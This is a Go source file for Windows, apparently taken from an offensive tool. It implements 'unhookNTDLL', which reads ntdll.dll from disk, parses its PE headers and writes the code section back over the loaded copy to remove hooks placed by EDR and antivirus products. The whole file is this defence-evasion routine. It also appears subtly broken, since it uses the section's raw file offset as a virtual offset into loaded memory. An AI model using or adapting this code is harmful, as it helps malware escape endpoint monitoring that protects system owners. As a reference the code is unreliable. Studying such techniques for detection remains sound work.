//go:build windows

package main

import (
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

// unhookNTDLL remaps a fresh copy of ntdll.dll from disk and overwrites the
// in-memory .text section, removing any userland hooks placed by EDR/AV.
func unhookNTDLL() error {
	// Read ntdll from disk
	sysDir, err := windows.GetSystemDirectory()
	if err != nil {
		return fmt.Errorf("GetSystemDirectory: %w", err)
	}
	ntdllPath := sysDir + `\ntdll.dll`
	fileData, err := os.ReadFile(ntdllPath)
	if err != nil {
		return fmt.Errorf("ReadFile(ntdll): %w", err)
	}

	// Find the loaded (hooked) ntdll base
	ntdllName, _ := windows.UTF16PtrFromString("ntdll.dll")
	hMod, _, e2 := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllName)))
	if hMod == 0 {
		return fmt.Errorf("GetModuleHandle(ntdll): %v", e2)
	}
	loadedBase := hMod

	// Parse on-disk PE to find .text VA and size
	textRVA, textSz, err := peTextSection(fileData)
	if err != nil {
		return fmt.Errorf("peTextSection: %w", err)
	}

	// Overwrite loaded .text section with clean bytes from disk
	dst := loadedBase + uintptr(textRVA)
	src := fileData[textRVA : textRVA+textSz]

	var oldProtect uint32
	r, _, e := procVirtualProtect.Call(
		dst, uintptr(textSz),
		uintptr(pageExecuteReadWrite), uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r == 0 {
		return fmt.Errorf("VirtualProtect(RWX): %v", e)
	}

	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(dst)), textSz)
	copy(dstSlice, src)

	procVirtualProtect.Call(dst, uintptr(textSz), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	return nil
}

// peTextSection returns the file offset and size of the first code section in a PE.
func peTextSection(pe []byte) (uint32, uint32, error) {
	if len(pe) < 64 {
		return 0, 0, fmt.Errorf("PE too small")
	}
	dosH := (*imageDosHeader)(unsafe.Pointer(&pe[0]))
	if dosH.eMagic != imageDosSignature {
		return 0, 0, fmt.Errorf("invalid DOS signature")
	}
	ntH := (*imageNtHeaders64)(unsafe.Pointer(&pe[dosH.eLfanew]))
	if ntH.Signature != imageNtSignature {
		return 0, 0, fmt.Errorf("invalid NT signature")
	}

	numSec := ntH.FileHeader.NumberOfSections
	firstSec := uintptr(dosH.eLfanew) + 4 +
		unsafe.Sizeof(imageFileHeader{}) +
		uintptr(ntH.FileHeader.SizeOfOptionalHeader)

	for i := uint16(0); i < numSec; i++ {
		sec := (*imageSectionHeader)(unsafe.Pointer(&pe[firstSec+uintptr(i)*unsafe.Sizeof(imageSectionHeader{})]))
		if sec.Characteristics&imageScnCntCode != 0 && sec.SizeOfRawData > 0 {
			return sec.PointerToRawData, sec.SizeOfRawData, nil
		}
	}
	return 0, 0, fmt.Errorf("no code section found")
}
